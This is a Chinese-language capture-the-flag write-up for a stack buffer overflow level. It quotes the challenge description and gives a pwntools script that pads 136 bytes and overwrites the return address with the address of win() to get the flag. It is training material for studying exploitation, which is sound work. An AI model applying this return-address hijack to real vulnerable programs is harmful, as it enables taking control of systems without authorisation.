# 挑战简介
```
我们的堆栈指针指向 0x7ffe8287e4b0，基指针指向 0x7ffe8287e550。
这意味着我们的堆栈框架中有（十进制）22 个 8 字节字，
包括保存的基指针和保存的返回地址，
总共 176 个字节。
输入缓冲区从 0x7ffe8287e4d0 开始，位于堆栈框架的中途，
（堆栈中“上方”是函数使用的其他局部变量）。
您的输入将被读入此缓冲区。
缓冲区长度为 101 个字节，但程序会让您提供任意大的输入长度，从而溢出缓冲区。

在这个级别中，没有“win”变量。
您需要强制程序执行 win() 函数，方法是直接溢出到存储的返回地址，返回到 main，该地址存储在 0x7ffe8287e558，即输入缓冲区开始后的 136 个字节。
这意味着您需要输入至少 144 个字节（101 个用于填充缓冲区，35 个用于填充存储在缓冲区和返回地址之间的其他内容，8 个将覆盖返回地址）。
我们已针对此挑战禁用以下标准内存损坏缓解措施：
- 禁用 canary，否则您会在覆盖返回地址之前损坏它，程序将中止。
- 二进制文件*不是*位置无关的。这意味着每次运行时它都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道覆盖返回地址所需的确切值。
您已选择发送 4096 字节的输入！
这将允许您从 0x7ffe8287e4d0（输入缓冲区的起始位置）写入
直到（但不包括）0x7ffe8287f4d0（超出缓冲区末尾 3995 字节）。
其中，您将覆盖 3960 字节到返回地址。
如果该数字大于 8，您将覆盖整个返回地址。
您将需要用 0x4020ca（即 win() 函数的地址）覆盖 challenge() 的返回值
（位于 0x7ffe8287e558，超出输入缓冲区起始位置 136 字节）。
这将导致 challenge() 直接返回到 win() 函数，
而 win() 函数又会为您提供标志。
请记住，您需要以小端序（字节倒序）写入 win() 函数的地址，以便正确解释。

发送您的有效载荷（最多 4096 字节）！
```

# 思路
此题要求，在栈溢出的基础上，覆盖栈外函数地址，使其执行其他函数

win函数的地址是已知条件，所以我们只要在规定的地址范围内调用win函数的地址即可

```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-control-hijack-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
p.send(b'a' * 136 + b'\xca\x20\x40')
p.recvall()
```
